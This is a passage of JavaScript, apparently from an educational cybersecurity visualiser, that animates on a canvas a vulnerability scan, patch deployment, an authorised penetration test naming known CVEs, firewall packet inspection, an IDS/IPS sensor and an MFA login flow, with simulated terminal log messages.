                ctx.beginPath(); ctx.moveTo(scannerX + 28, scannerY); ctx.lineTo(host.x - 30, host.y);
                ctx.strokeStyle = `rgba(0, 229, 255, ${0.3 + Math.sin(frame * 0.15) * 0.15})`; ctx.lineWidth = 1; ctx.setLineDash([4, 4]); ctx.stroke(); ctx.setLineDash([]);
            }
        });
        if (frame % 15 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = portsScanned;
            if (e1) e1.textContent = servicesFound;
            if (e2) e2.textContent = vulnsDetected;
            if (e3) e3.textContent = criticalCVEs;
            setProgress(Math.min(100, (frame / 450) * 100));
        }

        if (frame >= 450) {
            setProgress(100);
            termLog(`> Scan complete — ${vulnsDetected} vulnerabilities found, ${criticalCVEs} critical. Patch immediately!`, 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulatePatching = function() {
    termLog('> Initiating patch management cycle...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, systemsScanned = 0, patchesAvailable = 0, patchesApplied = 0, systemsSecured = 0;
    const systems = [];
    const cols = 6, rows = 3;
    for (let r = 0; r < rows; r++) {
        for (let c = 0; c < cols; c++) {
            const sx = w * 0.15 + c * (w * 0.13);
            const sy = h * 0.2 + r * (h * 0.26);
            const vulnLevel = rndInt(0, 3); // 0 = clean, 1 = low, 2 = med, 3 = critical
            systems.push({
                x: sx, y: sy,
                name: `SRV-${String(r * cols + c + 1).padStart(2, '0')}`,
                vulnLevel,
                status: 'unscanned', // unscanned → scanned → downloading → patching → patched
                patchProgress: 0,
                downloadProgress: 0,
            });
        }
    }

    let phase = 0; // 0=scan, 1=download, 2=patch, 3=verify
    let scanIdx = 0;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Scanning systems for missing patches...', 'warning'); }, 400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Patches downloaded. Deploying to staging for validation...', 'warning'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Rolling out approved patches to production systems...', 'warning'); }, 3600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Post-patch verification scan in progress...', 'info'); }, 5000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('SECURITY PATCH MANAGEMENT — DEPLOYMENT CYCLE', w / 2, 16);
        const phases = ['SCANNING', 'DOWNLOADING', 'PATCHING', 'VERIFIED'];
        const phaseColors = ['#00e5ff', '#ffaa00', '#e040fb', '#39ff14'];
        if (frame < 120) phase = 0;
        else if (frame < 220) phase = 1;
        else if (frame < 360) phase = 2;
        else phase = 3;

        ctx.fillStyle = phaseColors[phase]; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
        ctx.fillText(`PHASE: ${phases[phase]}`, w / 2, h * 0.94);
        if (phase === 0 && frame % 6 === 0 && scanIdx < systems.length) {
            systems[scanIdx].status = 'scanned';
            systemsScanned++;
            if (systems[scanIdx].vulnLevel > 0) patchesAvailable++;
            scanIdx++;
        }
        if (phase === 1) {
            systems.forEach(sys => {
                if (sys.status === 'scanned' && sys.vulnLevel > 0) {
                    sys.status = 'downloading';
                }
                if (sys.status === 'downloading') {
                    sys.downloadProgress += 0.025;
                    if (sys.downloadProgress >= 1) sys.status = 'ready';
                }
            });
        }
        if (phase === 2) {
            systems.forEach(sys => {
                if (sys.status === 'ready' || (sys.status === 'scanned' && sys.vulnLevel > 0)) {
                    sys.status = 'patching';
                }
                if (sys.status === 'patching') {
                    sys.patchProgress += 0.015;
                    if (sys.patchProgress >= 1) {
                        sys.status = 'patched';
                        sys.vulnLevel = 0;
                        patchesApplied++;
                    }
                }
            });
        }
        if (phase === 3) {
            systems.forEach(sys => {
                if (sys.status !== 'verified') {
                    sys.status = 'verified';
                    systemsSecured++;
                }
            });
        }
        systems.forEach(sys => {
            let boxColor, bgColor, statusText;
            switch (sys.status) {
                case 'unscanned':
                    boxColor = 'rgba(255,255,255,0.15)'; bgColor = 'rgba(255,255,255,0.02)'; statusText = '...'; break;
                case 'scanned':
                    boxColor = sys.vulnLevel > 1 ? '#ff3b3b' : sys.vulnLevel > 0 ? '#ffaa00' : '#39ff14';
                    bgColor = sys.vulnLevel > 1 ? 'rgba(255,59,59,0.08)' : sys.vulnLevel > 0 ? 'rgba(255,170,0,0.06)' : 'rgba(57,255,20,0.06)';
                    statusText = sys.vulnLevel > 0 ? `${sys.vulnLevel} CVEs` : 'OK'; break;
                case 'downloading':
                    boxColor = '#ffaa00'; bgColor = 'rgba(255,170,0,0.06)'; statusText = 'DL...'; break;
                case 'ready':
                    boxColor = '#e040fb'; bgColor = 'rgba(224,64,251,0.06)'; statusText = 'READY'; break;
                case 'patching':
                    boxColor = '#e040fb'; bgColor = 'rgba(224,64,251,0.08)'; statusText = 'APPLYING'; break;
                case 'patched': case 'verified':
                    boxColor = '#39ff14'; bgColor = 'rgba(57,255,20,0.1)'; statusText = '✓ SECURE'; break;
                default:
                    boxColor = 'rgba(255,255,255,0.15)'; bgColor = 'rgba(255,255,255,0.02)'; statusText = '...';
            }

            ctx.fillStyle = bgColor; ctx.strokeStyle = boxColor; ctx.lineWidth = 1;
            ctx.beginPath(); ctx.roundRect(sys.x - 28, sys.y - 22, 56, 44, 3); ctx.fill(); ctx.stroke();

            ctx.fillStyle = boxColor; ctx.font = 'bold 7px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
            ctx.fillText(sys.name, sys.x, sys.y - 10);
            ctx.font = '6px monospace';
            ctx.fillText(statusText, sys.x, sys.y + 4);
            if (sys.status === 'downloading') {
                ctx.fillStyle = 'rgba(255,255,255,0.1)';
                ctx.fillRect(sys.x - 20, sys.y + 14, 40, 3);
                ctx.fillStyle = '#ffaa00';
                ctx.fillRect(sys.x - 20, sys.y + 14, 40 * sys.downloadProgress, 3);
            }
            if (sys.status === 'patching') {
                ctx.fillStyle = 'rgba(255,255,255,0.1)';
                ctx.fillRect(sys.x - 20, sys.y + 14, 40, 3);
                ctx.fillStyle = '#e040fb';
                ctx.fillRect(sys.x - 20, sys.y + 14, 40 * sys.patchProgress, 3);
            }
        });
        if (frame % 15 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = systemsScanned;
            if (e1) e1.textContent = patchesAvailable;
            if (e2) e2.textContent = patchesApplied;
            if (e3) e3.textContent = systemsSecured;
            setProgress(Math.min(100, (frame / 440) * 100));
        }

        if (frame >= 440) {
            setProgress(100);
            termLog(`> Patch cycle complete. ${patchesApplied} patches applied. All systems secured.`, 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulatePentest = function() {
    termLog('> Initiating authorized penetration test (scope: 10.0.0.0/24)...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, hostsDiscovered = 0, exploitsAttempted = 0, shellsGained = 0;
    let privescLevel = 'None';
    const targets = [
        { x: w * 0.50, y: h * 0.18, ip: '10.0.0.1', os: 'Linux 5.15', service: 'Apache 2.4.49', vuln: 'CVE-2021-41773', exploitable: true, status: 'hidden' },
        { x: w * 0.78, y: h * 0.18, ip: '10.0.0.5', os: 'Win Server 2019', service: 'SMB 3.1.1', vuln: 'CVE-2020-0796', exploitable: true, status: 'hidden' },
        { x: w * 0.50, y: h * 0.50, ip: '10.0.0.10', os: 'Ubuntu 22.04', service: 'SSH 8.9p1', vuln: 'None', exploitable: false, status: 'hidden' },
        { x: w * 0.78, y: h * 0.50, ip: '10.0.0.20', os: 'CentOS 7', service: 'MySQL 5.7', vuln: 'CVE-2023-21912', exploitable: true, status: 'hidden' },
        { x: w * 0.64, y: h * 0.78, ip: '10.0.0.50', os: 'Win 10 Pro', service: 'RDP 10.0', vuln: 'CVE-2019-0708', exploitable: true, status: 'hidden' },
    ];
    const pentX = w * 0.10, pentY = h * 0.50;
    const exploitPackets = [];
    let activeTarget = null;
    let phaseProgress = 0; // 0=recon, 1=scan, 2=exploit, 3=privesc, 4=report

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Running Nmap -sV -sC on target subnet...', 'warning'); }, 800);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Vulnerability found: CVE-2021-41773 on 10.0.0.1. Launching Metasploit...', 'error'); }, 2800);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Shell gained! Attempting privilege escalation via kernel exploit...', 'error'); }, 4200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> ROOT ACCESS OBTAINED. Documenting findings for report.', 'error'); }, 5400);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('PENETRATION TEST — AUTHORIZED RED TEAM ENGAGEMENT', w / 2, 16);
        if (frame < 100) phaseProgress = 0;
        else if (frame < 200) phaseProgress = 1;
        else if (frame < 320) phaseProgress = 2;
        else if (frame < 400) phaseProgress = 3;
        else phaseProgress = 4;

        const phaseLabels = ['RECONNAISSANCE', 'SCANNING', 'EXPLOITATION', 'PRIVILEGE ESCALATION', 'REPORTING'];
        const phaseCols = ['#00e5ff', '#ffaa00', '#ff3b3b', '#e040fb', '#39ff14'];
        ctx.fillStyle = phaseCols[phaseProgress]; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
        ctx.fillText(`PHASE: ${phaseLabels[phaseProgress]}`, w / 2, h - 12);
        ctx.fillStyle = 'rgba(255, 145, 0, 0.1)'; ctx.strokeStyle = '#ff9100'; ctx.lineWidth = 1.5;
        ctx.beginPath(); ctx.roundRect(pentX - 38, pentY - 32, 76, 64, 5); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ff9100'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
        ctx.fillText('PENTESTER', pentX, pentY - 16);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('Kali Linux', pentX, pentY);
        ctx.fillStyle = '#ff9100'; ctx.font = '6px monospace';
        ctx.fillText('Metasploit | Nmap', pentX, pentY + 14);
        if (phaseProgress >= 1 && frame % 20 === 0) {
            const hidden = targets.filter(t => t.status === 'hidden');
            if (hidden.length > 0) {
                const t = hidden[0];
                t.status = 'discovered';
                hostsDiscovered++;
                termLog(`> Host discovered: ${t.ip} (${t.os}) — ${t.service}`, 'info');
            }
        }
        if (phaseProgress >= 2 && frame % 30 === 0) {
            const exploitable = targets.filter(t => t.exploitable && t.status === 'discovered');
            if (exploitable.length > 0) {
                activeTarget = exploitable[0];
                exploitPackets.push({ tx: activeTarget.x, ty: activeTarget.y, progress: 0 });
                exploitsAttempted++;
            }
        }
        if (phaseProgress === 3) {
            if (frame === 320) privescLevel = 'User';
            if (frame === 360) { privescLevel = 'Root'; termLog('> id = uid=0(root) gid=0(root)', 'error'); }
        }
        for (let i = exploitPackets.length - 1; i >= 0; i--) {
            const ep = exploitPackets[i];
            ep.progress += 0.02;
            const epx = pentX + 38 + (ep.tx - 45 - pentX - 38) * ep.progress;
            const epy = pentY + (ep.ty - pentY) * ep.progress;
            const alpha = 1 - ep.progress * 0.5;
            ctx.fillStyle = `rgba(255, 59, 59, ${alpha * 0.6})`; ctx.strokeStyle = `rgba(255, 59, 59, ${alpha})`;
            ctx.lineWidth = 1;
            ctx.beginPath(); ctx.roundRect(epx - 16, epy - 7, 32, 14, 2); ctx.fill(); ctx.stroke();
            ctx.fillStyle = `rgba(255, 255, 255, ${alpha})`; ctx.font = 'bold 5px monospace'; ctx.textAlign = 'center';
            ctx.fillText('EXPLOIT', epx, epy + 1);

            if (ep.progress >= 1) {
                exploitPackets.splice(i, 1);
                const compromised = targets.find(t => t.x === ep.tx && t.y === ep.ty && t.status === 'discovered');
                if (compromised) {
                    compromised.status = 'compromised';
                    shellsGained++;
                    termLog(`> Shell gained on ${compromised.ip} via ${compromised.vuln}!`, 'error');
                }
            }
        }
        targets.forEach(t => {
            let color, bg, label;
            switch (t.status) {
                case 'hidden':
                    color = 'rgba(255,255,255,0.12)'; bg = 'rgba(255,255,255,0.02)'; label = '?'; break;
                case 'discovered':
                    color = t.exploitable ? '#ffaa00' : '#39ff14';
                    bg = t.exploitable ? 'rgba(255,170,0,0.06)' : 'rgba(57,255,20,0.06)';
                    label = t.vuln !== 'None' ? t.vuln.substring(0, 14) : 'SECURE'; break;
                case 'compromised':
                    color = '#ff3b3b'; bg = 'rgba(255,59,59,0.12)'; label = '🔓 SHELL'; break;
                default:
                    color = 'rgba(255,255,255,0.12)'; bg = 'rgba(255,255,255,0.02)'; label = '?';
            }

            ctx.fillStyle = bg; ctx.strokeStyle = color; ctx.lineWidth = 1;
            ctx.beginPath(); ctx.roundRect(t.x - 45, t.y - 26, 90, 52, 4); ctx.fill(); ctx.stroke();

            ctx.fillStyle = color; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
            ctx.fillText(t.status !== 'hidden' ? t.ip : '???', t.x, t.y - 14);
            ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
            ctx.fillText(t.status !== 'hidden' ? `${t.os} | ${t.service}` : 'Unknown', t.x, t.y);
            ctx.fillStyle = color; ctx.font = 'bold 6px monospace';
            ctx.fillText(label, t.x, t.y + 14);
            if (t.status === 'compromised') {
                const pr = 50 + Math.sin(frame * 0.08) * 5;
                ctx.beginPath(); ctx.arc(t.x, t.y, pr, 0, Math.PI * 2);
                ctx.strokeStyle = 'rgba(255, 59, 59, 0.12)'; ctx.lineWidth = 1; ctx.stroke();
            }
            if (t.status === 'discovered' && phaseProgress <= 2) {
                ctx.beginPath(); ctx.moveTo(pentX + 38, pentY); ctx.lineTo(t.x - 45, t.y);
                ctx.strokeStyle = 'rgba(255, 170, 0, 0.12)'; ctx.lineWidth = 0.5; ctx.setLineDash([3, 4]); ctx.stroke(); ctx.setLineDash([]);
            }
        });
        if (frame % 15 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = hostsDiscovered;
            if (e1) e1.textContent = exploitsAttempted;
            if (e2) e2.textContent = shellsGained;
            if (e3) { e3.textContent = privescLevel; e3.style.color = privescLevel === 'Root' ? '#ff3b3b' : privescLevel === 'User' ? '#ffaa00' : '#8892a8'; }
            setProgress(Math.min(100, (frame / 460) * 100));
        }

        if (frame >= 460) {
            setProgress(100);
            termLog(`> Pentest complete. ${shellsGained} shells gained, privesc to ${privescLevel}. Remediate findings immediately!`, 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateFirewall = function() {
    termLog('> Booting Next-Gen Firewall engine...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, packetsInspected = 0, threatsBlocked = 0, activeSessions = 0;
    const packets = [];
    const internalX = w * 0.85, internalY = h * 0.5;
    const externalX = w * 0.15;
    const fwX = w * 0.5, fwY = h * 0.5;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Next-Gen DPI rule check active. Port 80/443 open. Port 21/22 blocked.', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Alert: Inbound packet payload signature match on Port 80 (SQLi SQL-syntax).', 'error'); }, 1800);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Action: Stateful filter dropped SQLi packet. Threat source blocked.', 'error'); }, 3000);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Safe state verified. Allowed established traffic continues to flow.', 'success'); }, 4200);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('FIREWALL DEEP PACKET INSPECTION & ACL ROUTING', w / 2, 20);
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(externalX - 50, h * 0.2, 100, h * 0.6, 5); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#8892a8'; ctx.font = 'bold 8px monospace';
        ctx.fillText('EXTERNAL NETWORK', externalX, h * 0.25);
        ctx.fillText('(Internet Traffic)', externalX, h * 0.29);
        const isAlerting = (frame > 110 && frame < 200);
        ctx.fillStyle = isAlerting ? 'rgba(229, 57, 53, 0.15)' : 'rgba(255, 255, 255, 0.02)';
        ctx.strokeStyle = isAlerting ? '#e53935' : 'rgba(255, 255, 255, 0.2)';
        ctx.lineWidth = 2;
        ctx.beginPath(); ctx.roundRect(fwX - 25, h * 0.15, 50, h * 0.7, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isAlerting ? '#e53935' : '#8892a8'; ctx.font = 'bold 9px monospace';
        ctx.fillText('NGFW', fwX, h * 0.22);
        ctx.fillText(isAlerting ? '[ BLOCK ]' : '[ INSPECT ]', fwX, h * 0.78);
        ctx.fillStyle = 'rgba(57, 255, 20, 0.05)'; ctx.strokeStyle = '#39ff14';
        ctx.beginPath(); ctx.roundRect(internalX - 50, h * 0.3, 100, h * 0.4, 5); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#39ff14'; ctx.font = 'bold 8px monospace';
        ctx.fillText('INTERNAL ZONE', internalX, h * 0.36);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('Web Server', internalX, h * 0.46);
        ctx.fillText('10.0.0.100', internalX, h * 0.52);
        if (frame % 20 === 0) {
            const isMalicious = (frame > 100 && frame < 220 && Math.random() > 0.4);
            const targetPort = isMalicious ? 80 : (Math.random() > 0.5 ? 443 : 21); // Port 21 is blocked
            packets.push({
                x: externalX,
                y: h * 0.3 + Math.random() * (h * 0.4),
                progress: 0,
                type: isMalicious ? 'malicious' : (targetPort === 21 ? 'unauthorized' : 'legitimate'),
                port: targetPort,
            });
        }
        for (let i = packets.length - 1; i >= 0; i--) {
            const p = packets[i];
            p.progress += 0.02;
            const px = externalX + (internalX - externalX) * p.progress;

            let col = '#00e5ff';
            if (p.type === 'malicious') col = '#ff3b3b';
            else if (p.type === 'unauthorized') col = '#ffaa00';
            else col = '#39ff14';
            ctx.fillStyle = col;
            ctx.beginPath(); ctx.arc(px, p.y, 4, 0, Math.PI * 2); ctx.fill();
            ctx.font = '6px monospace'; ctx.fillStyle = '#fff';
            ctx.fillText(`P:${p.port}`, px, p.y - 8);
            if (px >= fwX - 25 && px <= fwX + 25) {
                packetsInspected++;
                if (p.type === 'malicious' || p.type === 'unauthorized') {
                    threatsBlocked++;
                    packets.splice(i, 1); // Drop packet
                    continue;
                }
            }

            if (p.progress >= 1) {
                packets.splice(i, 1);
                activeSessions = Math.min(100, activeSessions + 1);
            }
        }
        if (frame % 15 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = packetsInspected;
            if (e1) e1.textContent = threatsBlocked;
            if (e2) e2.textContent = activeSessions;
            if (e3) e3.textContent = `${Math.min(95, 10 + Math.round(activeSessions * 0.6))}%`;
            setProgress(Math.min(100, (frame / 400) * 100));
        }

        if (frame >= 400) {
            setProgress(100);
            termLog('> NGFW Inspection simulation complete. Outbound & inbound traffic successfully routed.', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateIDS = function() {
    termLog('> Activating IDS/IPS mirroring sensor...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, alerts = 0, blockedIPs = 0, monitoredRate = 1.2;
    const packets = [];
    const tapX = w * 0.45, tapY = h * 0.4;
    const idsX = w * 0.45, idsY = h * 0.75;
    const startX = w * 0.1, endX = w * 0.9;
    const trafficY = h * 0.4;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Capturing flow packets. Analysis of signatures initialized.', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Alert: Signature ID: 2001928 matches brute-force ssh payload.', 'error'); }, 1800);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Dynamic defense: IPS triggered null route for malicious IP.', 'error'); }, 3000);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> System threat level normalized. Threat monitoring continues.', 'success'); }, 4200);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('INTRUSION DETECTION & PREVENTION SYSTEM (IDS/IPS)', w / 2, 20);
        ctx.strokeStyle = 'rgba(255,255,255,0.1)'; ctx.lineWidth = 3;
        ctx.beginPath(); ctx.moveTo(startX, trafficY); ctx.lineTo(endX, trafficY); ctx.stroke();
        ctx.fillStyle = '#3a4b5c'; ctx.beginPath(); ctx.arc(tapX, tapY, 12, 0, Math.PI * 2); ctx.fill();
        ctx.fillStyle = '#fff'; ctx.font = 'bold 8px monospace';
        ctx.fillText('TAP', tapX, tapY - 16);
        const alertFlash = (frame > 110 && frame < 200 && Math.sin(frame * 0.2) > 0);
        ctx.fillStyle = alertFlash ? 'rgba(255, 59, 59, 0.2)' : 'rgba(255, 152, 0, 0.1)';
        ctx.strokeStyle = alertFlash ? '#ff3b3b' : '#ff9800';
        ctx.beginPath(); ctx.roundRect(idsX - 40, idsY - 20, 80, 40, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = alertFlash ? '#ff3b3b' : '#ff9800'; ctx.font = 'bold 8px monospace';
        ctx.fillText(alertFlash ? 'IPS ALERT' : 'IDS SENSOR', idsX, idsY - 4);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText('Signature Engine', idsX, idsY + 10);
        ctx.strokeStyle = alertFlash ? 'rgba(255,59,59,0.3)' : 'rgba(255,152,0,0.3)';
        ctx.setLineDash([2, 3]);
        ctx.beginPath(); ctx.moveTo(tapX, tapY + 12); ctx.lineTo(idsX, idsY - 20); ctx.stroke();
        ctx.setLineDash([]);
        if (frame % 15 === 0) {
            const isAttack = (frame > 90 && frame < 200 && Math.random() > 0.4);
            packets.push({
                x: startX,
                y: trafficY,
                progress: 0,
                isMalicious: isAttack,
            });
        }
        for (let i = packets.length - 1; i >= 0; i--) {
            const p = packets[i];
            p.progress += 0.015;
            const px = startX + (endX - startX) * p.progress;

            ctx.fillStyle = p.isMalicious ? '#ff3b3b' : '#39ff14';
            ctx.beginPath(); ctx.arc(px, p.y, 4, 0, Math.PI * 2); ctx.fill();
            if (px > tapX - 10 && px < tapX + 10) {
                ctx.fillStyle = p.isMalicious ? 'rgba(255,59,59,0.5)' : 'rgba(255,152,0,0.5)';
                ctx.beginPath(); ctx.arc(idsX, idsY - 10, 4, 0, Math.PI * 2); ctx.fill();
                if (p.isMalicious) {
                    alerts++;
                    blockedIPs = Math.min(25, blockedIPs + 1);
                }
            }
        }
        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            monitoredRate = (1.1 + Math.sin(frame * 0.05) * 0.1).toFixed(1);
            if (e0) e0.textContent = `${monitoredRate} Gbps`;
            if (e2) e2.textContent = alerts;
            if (e3) e3.textContent = blockedIPs;
            setProgress(Math.min(100, (frame / 400) * 100));
        }

        if (frame >= 400) {
            setProgress(100);
            termLog('> IDS/IPS threat scan cycle ended. Logs archived.', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateMFA = function() {
    termLog('> Loading portal login validation module...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, attempts = 0, success = 0, bypass = 0, challenges = 0;
    let mfaStatus = 'waiting_pass'; // waiting_pass → waiting_mfa → authorized

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Username/Password verification: OK.', 'info'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> MFA Challenge initiated: OTP generated & sent to device.', 'warning'); }, 1500);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Awaiting second-factor input...', 'warning'); }, 2400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Token verified. MFA verification status: SUCCESS.', 'success'); }, 3500);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('MULTI-FACTOR AUTHENTICATION (MFA) WORKFLOW', w / 2, 20);
        if (frame === 60) {
            mfaStatus = 'waiting_mfa';
            challenges++;
            attempts++;
        }
        if (frame === 240) {
            mfaStatus = 'authorized';
            success++;
        }
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = '#00bcd4';
        ctx.beginPath(); ctx.roundRect(w * 0.15 - 50, h * 0.25, 100, h * 0.5, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#00bcd4'; ctx.font = 'bold 8px monospace';
        ctx.fillText('USER PORTAL', w * 0.15, h * 0.32);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('ID: admin_sec', w * 0.15, h * 0.44);
        ctx.fillText('PW: **********', w * 0.15, h * 0.50);
        ctx.fillStyle = (mfaStatus !== 'waiting_pass') ? '#39ff14' : '#8892a8';
        ctx.fillText('PASS: VERIFIED', w * 0.15, h * 0.62);
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = (mfaStatus === 'waiting_mfa') ? '#ff9800' : '#8892a8';
        ctx.beginPath(); ctx.roundRect(w * 0.85 - 40, h * 0.25, 80, h * 0.5, 8); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#8892a8'; ctx.font = 'bold 8px monospace';
        ctx.fillText('MOBILE AUTH', w * 0.85, h * 0.32);

        if (mfaStatus === 'waiting_mfa') {
            const blink = Math.sin(frame * 0.15) > 0;
            ctx.fillStyle = blink ? '#ff9800' : 'rgba(255,152,0,0.5)'; ctx.font = 'bold 9px monospace';
            ctx.fillText('CODE: 492 108', w * 0.85, h * 0.48);
            ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
            ctx.fillText('Approve login request?', w * 0.85, h * 0.58);
        } else if (mfaStatus === 'authorized') {
            ctx.fillStyle = '#39ff14'; ctx.font = 'bold 9px monospace';
            ctx.fillText('[ APPROVED ]', w * 0.85, h * 0.48);
        }
        ctx.fillStyle = 'rgba(255, 255, 255, 0.03)'; ctx.strokeStyle = 'rgba(255,255,255,0.15)';
        ctx.beginPath(); ctx.roundRect(w * 0.5 - 45, h * 0.3, 90, h * 0.4, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#fff'; ctx.font = 'bold 8px monospace';
        ctx.fillText('AUTH SERVER', w * 0.5, h * 0.38);

        let centerText = 'AWAITING LOGIN';
        let centerColor = '#8892a8';
        if (mfaStatus === 'waiting_mfa') {
            centerText = 'MFA CHALLENGE';
            centerColor = '#ff9800';
        } else if (mfaStatus === 'authorized') {
            centerText = 'ACCESS GRANTED';
            centerColor = '#39ff14';
        }
        ctx.fillStyle = centerColor; ctx.font = 'bold 8px monospace';
        ctx.fillText(centerText, w * 0.5, h * 0.52);
        if (mfaStatus === 'waiting_mfa') {
            ctx.strokeStyle = '#ff9800'; ctx.lineWidth = 1.5;
            ctx.beginPath(); ctx.moveTo(w * 0.5 + 45, h * 0.5); ctx.lineTo(w * 0.85 - 40, h * 0.5); ctx.stroke();
        } else if (mfaStatus === 'authorized') {
            ctx.strokeStyle = '#39ff14'; ctx.lineWidth = 1.5;
            ctx.beginPath(); ctx.moveTo(w * 0.85 - 40, h * 0.5); ctx.lineTo(w * 0.5 + 45, h * 0.5); ctx.stroke();
            ctx.beginPath(); ctx.moveTo(w * 0.5 - 45, h * 0.5); ctx.lineTo(w * 0.15 + 50, h * 0.5); ctx.stroke();
        }
        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = attempts;
            if (e1) e1.textContent = challenges;
            if (e2) e2.textContent = success;
            if (e3) e3.textContent = bypass;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> MFA Token verification validated. Access granted.', 'success');
            stopSimulation();
